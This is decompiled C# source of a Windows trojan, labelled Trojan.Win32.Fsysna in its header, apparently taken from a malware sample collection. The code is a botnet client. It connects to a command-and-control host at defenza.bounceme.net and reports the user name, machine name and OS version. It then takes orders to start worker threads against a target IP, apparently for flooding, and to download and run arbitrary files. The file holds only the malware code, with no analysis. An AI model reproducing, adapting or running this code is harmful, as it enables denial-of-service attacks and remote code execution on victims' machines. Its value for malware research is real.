// Decompiled with JetBrains decompiler
// Type: cliente.Program
// Assembly: cliente, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 93A55DE0-10E1-46A2-BE93-6BF6C932E5D1
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkys-27e1831bfa3ff50e5bd76882076cf96f1f0837b7433f502a8f2893e086e3ed2e.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace cliente
{
  internal static class Program
  {
    private static TcpClient tc;
    private static NetworkStream secu;
    private static StreamWriter eidjiedjeid;
    private static StreamReader ngnhgngh;
    private static config2[] trtrtr;

    [STAThread]
    private static void Main()
    {
      if (insta.jgtujugtjugtjgu())
        return;
      new Thread(new ThreadStart(insta.kljasdkljasdlkjadslkajsdklasdklasdkjlasdkjladsjskadkjsladkjladsdskl)).Start();
      Program.wewewewe();
    }

    private static string xlxlxlxlxl()
    {
      if (Environment.OSVersion.ToString().Contains("6.1"))
        return "w7";
      if (Environment.OSVersion.ToString().Contains("6.0"))
        return "wv";
      return Environment.OSVersion.ToString().Contains("5") ? "xp" : Environment.OSVersion.ToString();
    }

    private static void lasñladsñlaksdkñl(string eee, string fififi)
    {
      try
      {
        new WebClient().DownloadFile(eee, fififi);
        Process.Start(fififi);
      }
      catch
      {
      }
    }

    private static void wewewewe()
    {
      while (true)
      {
        Program.tc = new TcpClient();
        try
        {
          Program.tc.Connect("defenza.bounceme.net", 21);
          Program.secu = Program.tc.GetStream();
          Program.eidjiedjeid = new StreamWriter((Stream) Program.secu);
          Program.ngnhgngh = new StreamReader((Stream) Program.secu);
          Program.eidjiedjeid.WriteLine("qwerty-poiuy");
          Program.eidjiedjeid.WriteLine(Environment.UserName);
          Program.eidjiedjeid.WriteLine(Program.xlxlxlxlxl());
          Program.eidjiedjeid.WriteLine(Environment.MachineName);
          Program.eidjiedjeid.Flush();
          string str = "";
          while (str != "quit")
          {
            str = Program.ngnhgngh.ReadLine();
            if (str == "new")
            {
              string sSubsite = Program.ngnhgngh.ReadLine();
              string sIP = Program.ngnhgngh.ReadLine();
              int int32_1 = Convert.ToInt32(Program.ngnhgngh.ReadLine());
              int int32_2 = Convert.ToInt32(Program.ngnhgngh.ReadLine());
              Program.trtrtr = new config2[int32_2];
              for (int index = 0; index < int32_2; ++index)
                Program.trtrtr[index] = new config2(sIP, int32_1, sSubsite, false, 100, 1000);
              for (int index = 0; index < int32_2; ++index)
                Program.trtrtr[index].Start();
            }
            else if (str == "stop")
            {
              try
              {
                foreach (config2 config2 in Program.trtrtr)
                  config2.sakertuwsh = false;
                GC.Collect();
              }
              catch
              {
              }
            }
            else if (str == "down")
              Program.lasñladsñlaksdkñl(Program.ngnhgngh.ReadLine(), Program.ngnhgngh.ReadLine());
          }
        }
        catch
        {
          Program.tc.Close();
          GC.Collect();
          Thread.Sleep(10000);
        }
      }
    }
  }
}
